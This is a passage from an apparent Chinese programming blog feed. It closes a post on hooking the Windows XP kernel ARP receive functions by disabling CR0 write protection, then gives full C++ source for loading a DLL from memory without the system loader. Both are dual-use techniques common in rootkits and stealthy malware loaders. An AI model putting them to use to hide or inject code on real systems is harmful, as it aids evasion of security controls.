offset2=(char*)ARPRcvPacketProx-(char*)ARPRcvPacket-5;&lt;br&gt;//修正patchBytes和patchBytes2中的相对地址&lt;br&gt;memcpy(patchBytes+1,&amp;amp;offset,4);&lt;br&gt;memcpy(patchBytes2+1,&amp;amp;offset2,4);&lt;br&gt;if(isPatch)&lt;br&gt;{&lt;br&gt;DisableWriteProtect();//禁止写保护&lt;br&gt;memcpy(ARPRcv,patchBytes,5);&lt;br&gt;memcpy(ARPRcvPacket,patchBytes2,5);&lt;br&gt;EnableWriteProtect(); //开启写保护&lt;br&gt;}&lt;br&gt;else&lt;br&gt;{&lt;br&gt;DisableWriteProtect(); &lt;br&gt;memcpy(ARPRcv,restoreBytes,5);&lt;br&gt;memcpy(ARPRcvPacket,restoreBytes,5);&lt;br&gt;EnableWriteProtect();&lt;br&gt;}&lt;br&gt;}&lt;br&gt;因为ARPRcv和ARPRcvPacket函数处于只读页，所以必须先禁用写保护才能向其中插入代码，禁用写保护和开启写保护代码如下：&lt;br&gt;void&lt;br&gt;DisableWriteProtect()&lt;br&gt;{&lt;br&gt;_asm{ &lt;br&gt;cli &lt;br&gt;mov eax, cr0 &lt;br&gt;and eax, 0FFFEFFFFh&lt;br&gt;mov cr0, eax &lt;br&gt;} &lt;br&gt;}&lt;br&gt;void&lt;br&gt;EnableWriteProtect()&lt;br&gt;{&lt;br&gt;_asm{ &lt;br&gt;mov eax, cr0 &lt;br&gt;or eax, not 0FFFEFFFFh &lt;br&gt;mov cr0, eax &lt;br&gt;sti&lt;br&gt;}&lt;br&gt;}&lt;br&gt;注意这些代码暂时只适用XP系统，在win2000和win2003上都需要少许改动。&lt;/p&gt;</description></item><item><title>从内存中加载动态库(二)</title><link>https://blogs.qipai360.cn/post/loading-dynamic-library-from-memory-part-2/</link><pubDate>Thu, 17 Jul 2008 18:43:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/loading-dynamic-library-from-memory-part-2/</guid><description>&lt;p&gt;&lt;/p&gt; &lt;p&gt;五、加载类的源代码。（编译环境vc6,win98） &lt;p&gt;typedef&amp;nbsp;&amp;nbsp; BOOL (__stdcall *ProcDllMain)(HINSTANCE, DWORD,&amp;nbsp; LPVOID ); &lt;p&gt;class CMemLoadDll&lt;br&gt;{&lt;br&gt;public:&lt;br&gt; CMemLoadDll();&lt;br&gt; ~CMemLoadDll();&lt;br&gt; BOOL&amp;nbsp;&amp;nbsp;&amp;nbsp; MemLoadLibrary( void* lpFileData , int DataLength);&amp;nbsp; // Dll file data buffer&lt;br&gt; FARPROC MemGetProcAddress(LPCSTR lpProcName);&lt;br&gt;private:&lt;br&gt; BOOL isLoadOk;&lt;br&gt; BOOL CheckDataValide(void* lpFileData, int DataLength);&lt;br&gt; int&amp;nbsp; CalcTotalImageSize();&lt;br&gt; void CopyDllDatas(void* pDest, void* pSrc);&lt;br&gt; BOOL FillRavAddress(void* pBase);&lt;br&gt; void DoRelocation(void* pNewBase);&lt;br&gt; int&amp;nbsp; GetAlignedSize(int Origin, int Alignment); &lt;br&gt;private:&lt;br&gt; ProcDllMain pDllMain; &lt;p&gt;private:&lt;br&gt; DWORD&amp;nbsp; pImageBase;&lt;br&gt; PIMAGE_DOS_HEADER pDosHeader;&lt;br&gt; PIMAGE_NT_HEADERS pNTHeader;&lt;br&gt; PIMAGE_SECTION_HEADER pSectionHeader;&lt;br&gt;}; &lt;p&gt;CMemLoadDll::CMemLoadDll()&lt;br&gt;{&lt;br&gt; isLoadOk = FALSE;&lt;br&gt; pImageBase = NULL;&lt;br&gt; pDllMain = NULL;&lt;br&gt;}&lt;br&gt;CMemLoadDll::~CMemLoadDll()&lt;br&gt;{&lt;br&gt; if(isLoadOk)&lt;br&gt; {&lt;br&gt;&amp;nbsp; ASSERT(pImageBase != NULL);&lt;br&gt;&amp;nbsp; ASSERT(pDllMain&amp;nbsp;&amp;nbsp; != NULL);&lt;br&gt;&amp;nbsp; //脱钩，准备卸载dll&lt;br&gt;&amp;nbsp; pDllMain((HINSTANCE)pImageBase,DLL_PROCESS_DETACH,0);&lt;br&gt;&amp;nbsp; VirtualFree((LPVOID)pImageBase, 0, MEM_RELEASE);&lt;br&gt; }&lt;br&gt;} &lt;p&gt;//MemLoadLibrary函数从内存缓冲区数据中加载一个dll到当前进程的地址空间，缺省位置0x10000000&lt;br&gt;//返回值： 成功返回TRUE , 失败返回FALSE&lt;br&gt;//lpFileData: 存放dll文件数据的缓冲区&lt;br&gt;//DataLength: 缓冲区中数据的总长度&lt;br&gt;BOOL CMemLoadDll::MemLoadLibrary(void* lpFileData, int DataLength)&lt;br&gt;{&lt;br&gt; if(pImageBase != NULL)&lt;br&gt; {&lt;br&gt;&amp;nbsp; return FALSE;&amp;nbsp; //已经加载一个dll，还没有释放，不能加载新的dll&lt;br&gt; }&lt;br&gt; //检查数据有效性，并初始化&lt;br&gt; if(!CheckDataValide(lpFileData, DataLength))return FALSE;&lt;br&gt; //计算所需的加载空间&lt;br&gt; int ImageSize = CalcTotalImageSize();&lt;br&gt; if(ImageSize == 0) return FALSE; &lt;p&gt; // 分配虚拟内存&lt;br&gt; void *pMemoryAddress = VirtualAlloc((LPVOID)0x10000000, ImageSize,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE); &lt;br&gt; if(pMemoryAddress == NULL) return FALSE;&lt;br&gt; else&lt;br&gt; {&lt;br&gt;&amp;nbsp; CopyDllDatas(pMemoryAddress, lpFileData); //复制dll数据，并对齐每个段&lt;br&gt;&amp;nbsp; //重定位信息&lt;br&gt;&amp;nbsp; if(pNTHeader-&amp;gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress &amp;gt;0&lt;br&gt;&amp;nbsp;&amp;nbsp; &amp;amp;&amp;amp; pNTHeader-&amp;gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size&amp;gt;0)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp; DoRelocation(pMemoryAddress);&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;nbsp; //填充引入地址表&lt;br&gt;&amp;nbsp; if(!FillRavAddress(pMemoryAddress)) //修正引入地址表失败&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp; VirtualFree(pMemoryAddress,0,MEM_RELEASE);&lt;br&gt;&amp;nbsp;&amp;nbsp; return FALSE;&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;nbsp; //修改页属性。应该根据每个页的属性单独设置其对应内存页的属性。这里简化一下。&lt;br&gt;&amp;nbsp; //统一设置成一个属性PAGE_EXECUTE_READWRITE&lt;br&gt;&amp;nbsp; unsigned long old;&lt;br&gt;&amp;nbsp; VirtualProtect(pMemoryAddress, ImageSize, PAGE_EXECUTE_READWRITE,&amp;amp;old);&lt;br&gt; }&lt;br&gt; //修正基地址&lt;br&gt; pNTHeader-&amp;gt;OptionalHeader.ImageBase = (DWORD)pMemoryAddress; &lt;p&gt; //接下来要调用一下dll的入口函数，做初始化工作。&lt;br&gt; pDllMain = (ProcDllMain)(pNTHeader-&amp;gt;OptionalHeader.AddressOfEntryPoint +(DWORD) pMemoryAddress);&lt;br&gt; BOOL InitResult = pDllMain((HINSTANCE)pMemoryAddress,DLL_PROCESS_ATTACH,0);&lt;br&gt; if(!InitResult) //初始化失败&lt;br&gt; {&lt;br&gt;&amp;nbsp; pDllMain((HINSTANCE)pMemoryAddress,DLL_PROCESS_DETACH,0);&lt;br&gt;&amp;nbsp; VirtualFree(pMemoryAddress,0,MEM_RELEASE);&lt;br&gt;&amp;nbsp; pDllMain = NULL;&lt;br&gt;&amp;nbsp; return FALSE;&lt;br&gt; } &lt;p&gt; isLoadOk = TRUE;&lt;br&gt; pImageBase = (DWORD)pMemoryAddress;&lt;br&gt; return TRUE;&lt;br&gt;} &lt;p&gt;//MemGetProcAddress函数从dll中获取指定函数的地址&lt;br&gt;//返回值： 成功返回函数地址 , 失败返回NULL&lt;br&gt;//lpProcName: 要查找函数的名字或者序号&lt;br&gt;FARPROC&amp;nbsp; CMemLoadDll::MemGetProcAddress(LPCSTR lpProcName)&lt;br&gt;{&lt;br&gt; if(pNTHeader-&amp;gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0 ||&lt;br&gt;&amp;nbsp; pNTHeader-&amp;gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size == 0)&lt;br&gt;&amp;nbsp; return NULL;&lt;br&gt; if(!isLoadOk) return NULL; &lt;p&gt; DWORD OffsetStart = pNTHeader-&amp;gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;&lt;br&gt; DWORD Size = pNTHeader-&amp;gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size; &lt;p&gt; PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pImageBase + pNTHeader-&amp;gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);&lt;br&gt; int iBase = pExport-&amp;gt;Base;&lt;br&gt; int iNumberOfFunctions = pExport-&amp;gt;NumberOfFunctions;&lt;br&gt; int iNumberOfNames = pExport-&amp;gt;NumberOfNames; //&amp;lt;= iNumberOfFunctions&lt;br&gt; LPDWORD pAddressOfFunctions = (LPDWORD)(pExport-&amp;gt;AddressOfFunctions + pImageBase);&lt;br&gt; LPWORD&amp;nbsp; pAddressOfOrdinals = (LPWORD)(pExport-&amp;gt;AddressOfNameOrdinals + pImageBase);&lt;br&gt; LPDWORD pAddressOfNames&amp;nbsp; = (LPDWORD)(pExport-&amp;gt;AddressOfNames + pImageBase); &lt;p&gt; int iOrdinal = -1; &lt;p&gt; if(((DWORD)lpProcName &amp;amp; 0xFFFF0000) == 0) //IT IS A ORDINAL!&lt;br&gt; {&lt;br&gt;&amp;nbsp; iOrdinal = (DWORD)lpProcName &amp;amp; 0x0000FFFF - iBase;&lt;br&gt; }&lt;br&gt; else&amp;nbsp; //use name&lt;br&gt; {&lt;br&gt;&amp;nbsp; int iFound = -1; &lt;p&gt;&amp;nbsp; for(int i=0;i&amp;lt;iNumberOfNames;i++)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp; char* pName= (char* )(pAddressOfNames[i] + pImageBase);&lt;br&gt;&amp;nbsp;&amp;nbsp; if(strcmp(pName, lpProcName) == 0)&lt;br&gt;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; iFound = i; break;&lt;br&gt;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;nbsp; if(iFound &amp;gt;= 0)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp; iOrdinal = (int)(pAddressOfOrdinals[iFound]);&lt;br&gt;&amp;nbsp; }&lt;br&gt; } &lt;p&gt; if(iOrdinal &amp;lt; 0 || iOrdinal &amp;gt;= iNumberOfFunctions ) return NULL;&lt;br&gt; else&lt;br&gt; {&lt;br&gt;&amp;nbsp; DWORD pFunctionOffset = pAddressOfFunctions[iOrdinal];&lt;br&gt;&amp;nbsp; if(pFunctionOffset &amp;gt; OffsetStart &amp;amp;&amp;amp; pFunctionOffset &amp;lt; (OffsetStart+Size))//maybe Export Forwarding&lt;br&gt;&amp;nbsp;&amp;nbsp; return NULL;&lt;br&gt;&amp;nbsp; else return (FARPROC)(pFunctionOffset + pImageBase);&lt;br&gt; } &lt;p&gt;} &lt;p&gt;// 重定向PE用到的地址&lt;br&gt;void CMemLoadDll::DoRelocation( void *NewBase)&lt;br&gt;{&lt;br&gt; /* 重定位表的结构：&lt;br&gt; // DWORD sectionAddress, DWORD size (包括本节需要重定位的数据)&lt;br&gt; // 例如 1000节需要修正5个重定位数据的话，重定位表的数据是&lt;br&gt; // 00 10 00 00&amp;nbsp;&amp;nbsp; 14 00 00 00&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xxxx xxxx xxxx xxxx xxxx 0000&lt;br&gt; // -----------&amp;nbsp;&amp;nbsp; -----------&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ----&lt;br&gt; // 给出节的偏移&amp;nbsp; 总尺寸=8+6*2&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 需要修正的地址&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 用于对齐4字节&lt;br&gt; // 重定位表是若干个相连，如果address 和 size都是0 表示结束&lt;br&gt; // 需要修正的地址是12位的，高4位是形态字，intel cpu下是3&lt;br&gt; */&lt;br&gt; //假设NewBase是0x600000,而文件中设置的缺省ImageBase是0x400000,则修正偏移量就是0x200000&lt;br&gt; DWORD Delta = (DWORD)NewBase - pNTHeader-&amp;gt;OptionalHeader.ImageBase; &lt;p&gt; //注意重定位表的位置可能和硬盘文件中的偏移地址不同，应该使用加载后的地址&lt;br&gt; PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)((unsigned long)NewBase &lt;br&gt;&amp;nbsp; + pNTHeader-&amp;gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);&lt;br&gt; while((pLoc-&amp;gt;VirtualAddress + pLoc-&amp;gt;SizeOfBlock) != 0) //开始扫描重定位表&lt;br&gt; {&lt;br&gt;&amp;nbsp; WORD *pLocData = (WORD *)((int)pLoc + sizeof(IMAGE_BASE_RELOCATION));&lt;br&gt;&amp;nbsp; //计算本节需要修正的重定位项（地址）的数目&lt;br&gt;&amp;nbsp; int NumberOfReloc = (pLoc-&amp;gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);&lt;br&gt;&amp;nbsp; for( int i=0 ; i &amp;lt; NumberOfReloc; i++)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp; if( (DWORD)(pLocData[i] &amp;amp; 0xF000) == 0x00003000) //这是一个需要修正的地址&lt;br&gt;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // 举例： &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // pLoc-&amp;gt;VirtualAddress = 0x1000; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // pLocData[i] = 0x313E; 表示本节偏移地址0x13E处需要修正&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // 因此 pAddress = 基地址 + 0x113E&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // 里面的内容是 A1 ( 0c d4 02 10)&amp;nbsp; 汇编代码是： mov eax , [1002d40c]&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // 需要修正1002d40c这个地址&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD * pAddress = (DWORD *)((unsigned long)NewBase + pLoc-&amp;gt;VirtualAddress + (pLocData[i] &amp;amp; 0x0FFF));&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *pAddress += Delta;&lt;br&gt;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;nbsp; //转移到下一个节进行处理&lt;br&gt;&amp;nbsp; pLoc = (PIMAGE_BASE_RELOCATION)((DWORD)pLoc + pLoc-&amp;gt;SizeOfBlock);&lt;br&gt; }&lt;br&gt;} &lt;p&gt;//填充引入地址表&lt;br&gt;BOOL CMemLoadDll::FillRavAddress(void *pImageBase)&lt;br&gt;{&lt;br&gt; // 引入表实际上是一个 IMAGE_IMPORT_DESCRIPTOR 结构数组，全部是0表示结束&lt;br&gt; // 数组定义如下：&lt;br&gt; // &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // DWORD&amp;nbsp;&amp;nbsp; OriginalFirstThunk;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; // 0表示结束，否则指向未绑定的IAT结构数组&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // DWORD&amp;nbsp;&amp;nbsp; TimeDateStamp; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // DWORD&amp;nbsp;&amp;nbsp; ForwarderChain;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; // -1 if no forwarders&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // DWORD&amp;nbsp;&amp;nbsp; Name;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; // 给出dll的名字&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // DWORD&amp;nbsp;&amp;nbsp; FirstThunk;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; // 指向IAT结构数组的地址(绑定后，这些IAT里面就是实际的函数地址)&lt;br&gt; unsigned long Offset = pNTHeader-&amp;gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress ;&lt;br&gt; if(Offset == 0) return TRUE; //No Import Table&lt;br&gt; PIMAGE_IMPORT_DESCRIPTOR pID = (PIMAGE_IMPORT_DESCRIPTOR)((unsigned long) pImageBase + Offset);&lt;br&gt; while(pID-&amp;gt;Characteristics != 0 )&lt;br&gt; {&lt;br&gt;&amp;nbsp; PIMAGE_THUNK_DATA pRealIAT = (PIMAGE_THUNK_DATA)((unsigned long)pImageBase + pID-&amp;gt;FirstThunk);&lt;br&gt;&amp;nbsp; PIMAGE_THUNK_DATA pOriginalIAT = (PIMAGE_THUNK_DATA)((unsigned long)pImageBase + pID-&amp;gt;OriginalFirstThunk);&lt;br&gt;&amp;nbsp; //获取dll的名字&lt;br&gt;&amp;nbsp; char buf[256]; //dll name;&lt;br&gt;&amp;nbsp; BYTE* pName = (BYTE*)((unsigned long)pImageBase + pID-&amp;gt;Name);&lt;br&gt;&amp;nbsp; for(int i=0;i&amp;lt;256;i++)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp; if(pName[i] == 0)break;&lt;br&gt;&amp;nbsp;&amp;nbsp; buf[i] = pName[i];&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;nbsp; if(i&amp;gt;=256) return FALSE;&amp;nbsp; // bad dll name&lt;br&gt;&amp;nbsp; else buf[i] = 0;&lt;br&gt;&amp;nbsp; HMODULE hDll = GetModuleHandle(buf);&lt;br&gt;&amp;nbsp; if(hDll == NULL)return FALSE; //NOT FOUND DLL&lt;br&gt;&amp;nbsp; //获取DLL中每个导出函数的地址，填入IAT&lt;br&gt;&amp;nbsp; //每个IAT结构是 ：&lt;br&gt;&amp;nbsp; // union { PBYTE&amp;nbsp; ForwarderString;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //&amp;nbsp;&amp;nbsp; PDWORD Function;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //&amp;nbsp;&amp;nbsp; DWORD Ordinal;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //&amp;nbsp;&amp;nbsp; PIMAGE_IMPORT_BY_NAME&amp;nbsp; AddressOfData;&lt;br&gt;&amp;nbsp; // } u1;&lt;br&gt;&amp;nbsp; // 长度是一个DWORD ，正好容纳一个地址。&lt;br&gt;&amp;nbsp; for(i=0; ;i++)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp; if(pOriginalIAT[i].u1.Function == 0)break;&lt;br&gt;&amp;nbsp;&amp;nbsp; FARPROC lpFunction = NULL;&lt;br&gt;&amp;nbsp;&amp;nbsp; if(pOriginalIAT[i].u1.Ordinal &amp;amp; IMAGE_ORDINAL_FLAG) //这里的值给出的是导出序号&lt;br&gt;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; lpFunction = GetProcAddress(hDll, (LPCSTR)(pOriginalIAT[i].u1.Ordinal &amp;amp; 0x0000FFFF));&lt;br&gt;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp; else //按照名字导入&lt;br&gt;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; //获取此IAT项所描述的函数名称&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PIMAGE_IMPORT_BY_NAME pByName = (PIMAGE_IMPORT_BY_NAME)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ((DWORD)pImageBase + (DWORD)(pOriginalIAT[i].u1.AddressOfData));&lt;br&gt;//&amp;nbsp;&amp;nbsp;&amp;nbsp; if(pByName-&amp;gt;Hint !=0)&lt;br&gt;//&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lpFunction = GetProcAddress(hDll, (LPCSTR)pByName-&amp;gt;Hint);&lt;br&gt;//&amp;nbsp;&amp;nbsp;&amp;nbsp; else&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lpFunction = GetProcAddress(hDll, (char *)pByName-&amp;gt;Name);&lt;br&gt;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp; if(lpFunction != NULL)&amp;nbsp;&amp;nbsp; //找到了！&lt;br&gt;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pRealIAT[i].u1.Function = (PDWORD) lpFunction;&lt;br&gt;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp; else return FALSE;&lt;br&gt;&amp;nbsp; } &lt;p&gt;&amp;nbsp; //move to next &lt;br&gt;&amp;nbsp; pID = (PIMAGE_IMPORT_DESCRIPTOR)( (DWORD)pID + sizeof(IMAGE_IMPORT_DESCRIPTOR));&lt;br&gt; }&lt;br&gt; return TRUE;&lt;br&gt;} &lt;p&gt;//CheckDataValide函数用于检查缓冲区中的数据是否有效的dll文件&lt;br&gt;//返回值： 是一个可执行的dll则返回TRUE，否则返回FALSE。&lt;br&gt;//lpFileData: 存放dll数据的内存缓冲区&lt;br&gt;//DataLength: dll文件的长度&lt;br&gt;BOOL CMemLoadDll::CheckDataValide(void* lpFileData, int DataLength)&lt;br&gt;{&lt;br&gt; //检查长度&lt;br&gt; if(DataLength &amp;lt; sizeof(IMAGE_DOS_HEADER)) return FALSE;&lt;br&gt; pDosHeader = (PIMAGE_DOS_HEADER)lpFileData;&amp;nbsp; // DOS头&lt;br&gt; //检查dos头的标记&lt;br&gt; if(pDosHeader-&amp;gt;e_magic != IMAGE_DOS_SIGNATURE) return FALSE;&amp;nbsp; //0x5A4D : MZ &lt;p&gt; //检查长度&lt;br&gt; if((DWORD)DataLength &amp;lt; (pDosHeader-&amp;gt;e_lfanew + sizeof(IMAGE_NT_HEADERS)) ) return FALSE;&lt;br&gt; //取得pe头&lt;br&gt; pNTHeader = (PIMAGE_NT_HEADERS)( (unsigned long)lpFileData + pDosHeader-&amp;gt;e_lfanew); // PE头&lt;br&gt; //检查pe头的合法性&lt;br&gt; if(pNTHeader-&amp;gt;Signature != IMAGE_NT_SIGNATURE) return FALSE;&amp;nbsp; //0x00004550 : PE00&lt;br&gt; if((pNTHeader-&amp;gt;FileHeader.Characteristics &amp;amp; IMAGE_FILE_DLL) == 0) //0x2000&amp;nbsp; : File is a DLL&lt;br&gt;&amp;nbsp; return FALSE;&amp;nbsp; &lt;br&gt; if((pNTHeader-&amp;gt;FileHeader.Characteristics &amp;amp; IMAGE_FILE_EXECUTABLE_IMAGE) == 0) //0x0002 : 指出文件可以运行&lt;br&gt;&amp;nbsp; return FALSE;&lt;br&gt; if(pNTHeader-&amp;gt;FileHeader.SizeOfOptionalHeader != sizeof(IMAGE_OPTIONAL_HEADER)) return FALSE; &lt;p&gt; //取得节表（段表）&lt;br&gt; pSectionHeader = (PIMAGE_SECTION_HEADER)((int)pNTHeader + sizeof(IMAGE_NT_HEADERS));&lt;br&gt; //验证每个节表的空间&lt;br&gt; for(int i=0; i&amp;lt; pNTHeader-&amp;gt;FileHeader.NumberOfSections; i++)&lt;br&gt; {&lt;br&gt;&amp;nbsp; if((pSectionHeader[i].PointerToRawData + pSectionHeader[i].SizeOfRawData) &amp;gt; (DWORD)DataLength)return FALSE;&lt;br&gt; }&lt;br&gt; return TRUE;&lt;br&gt;} &lt;p&gt;//计算对齐边界&lt;br&gt;int CMemLoadDll::GetAlignedSize(int Origin, int Alignment)&lt;br&gt;{&lt;br&gt; return (Origin + Alignment - 1) / Alignment * Alignment;&lt;br&gt;}&lt;br&gt;//计算整个dll映像文件的尺寸&lt;br&gt;int CMemLoadDll::CalcTotalImageSize()&lt;br&gt;{&lt;br&gt; int Size;&lt;br&gt; if(pNTHeader == NULL)return 0;&lt;br&gt; int nAlign = pNTHeader-&amp;gt;OptionalHeader.SectionAlignment; //段对齐字节数 &lt;p&gt; // 计算所有头的尺寸。包括dos, coff, pe头 和 段表的大小&lt;br&gt; Size = GetAlignedSize(pNTHeader-&amp;gt;OptionalHeader.SizeOfHeaders, nAlign);&lt;br&gt; // 计算所有节的大小&lt;br&gt; for(int i=0; i &amp;lt; pNTHeader-&amp;gt;FileHeader.NumberOfSections; ++i)&lt;br&gt; {&lt;br&gt;&amp;nbsp; //得到该节的大小&lt;br&gt;&amp;nbsp; int CodeSize = pSectionHeader[i].Misc.VirtualSize ;&lt;br&gt;&amp;nbsp; int LoadSize = pSectionHeader[i].SizeOfRawData;&lt;br&gt;&amp;nbsp; int MaxSize = (LoadSize &amp;gt; CodeSize)?(LoadSize):(CodeSize); &lt;p&gt;&amp;nbsp; int SectionSize = GetAlignedSize(pSectionHeader[i].VirtualAddress + MaxSize, nAlign);&lt;br&gt;&amp;nbsp; if(Size &amp;lt; SectionSize) &lt;br&gt;&amp;nbsp;&amp;nbsp; Size = SectionSize;&amp;nbsp; //Use the Max;&lt;br&gt; }&lt;br&gt; return Size;&lt;br&gt;}&lt;br&gt;//CopyDllDatas函数将dll数据复制到指定内存区域，并对齐所有节&lt;br&gt;//pSrc: 存放dll数据的原始缓冲区&lt;br&gt;//pDest:目标内存地址&lt;br&gt;void CMemLoadDll::CopyDllDatas(void* pDest, void* pSrc)&lt;br&gt;{&lt;br&gt; // 计算需要复制的PE头+段表字节数&lt;br&gt; int&amp;nbsp; HeaderSize = pNTHeader-&amp;gt;OptionalHeader.SizeOfHeaders;&lt;br&gt; int&amp;nbsp; SectionSize = pNTHeader-&amp;gt;FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);&lt;br&gt; int&amp;nbsp; MoveSize = HeaderSize + SectionSize;&lt;br&gt; //复制头和段信息&lt;br&gt; memmove(pDest, pSrc, MoveSize); &lt;p&gt; //复制每个节&lt;br&gt; for(int i=0; i &amp;lt; pNTHeader-&amp;gt;FileHeader.NumberOfSections; ++i)&lt;br&gt; {&lt;br&gt;&amp;nbsp; if(pSectionHeader[i].VirtualAddress == 0 || pSectionHeader[i].SizeOfRawData == 0)continue;&lt;br&gt;&amp;nbsp; // 定位该节在内存中的位置&lt;br&gt;&amp;nbsp; void *pSectionAddress = (void *)((unsigned long)pDest + pSectionHeader[i].VirtualAddress);&lt;br&gt;&amp;nbsp; // 复制段数据到虚拟内存&lt;br&gt;&amp;nbsp; memmove((void *)pSectionAddress,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (void *)((DWORD)pSrc + pSectionHeader[i].PointerToRawData),&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pSectionHeader[i].SizeOfRawData);&lt;br&gt; } &lt;p&gt; //修正指针，指向新分配的内存&lt;br&gt; //新的dos头&lt;br&gt; pDosHeader = (PIMAGE_DOS_HEADER)pDest;&lt;br&gt; //新的pe头地址&lt;br&gt; pNTHeader = (PIMAGE_NT_HEADERS)((int)pDest + (pDosHeader-&amp;gt;e_lfanew));&lt;br&gt; //新的节表地址&lt;br&gt; pSectionHeader = (PIMAGE_SECTION_HEADER)((int)pNTHeader + sizeof(IMAGE_NT_HEADERS));&lt;br&gt; return 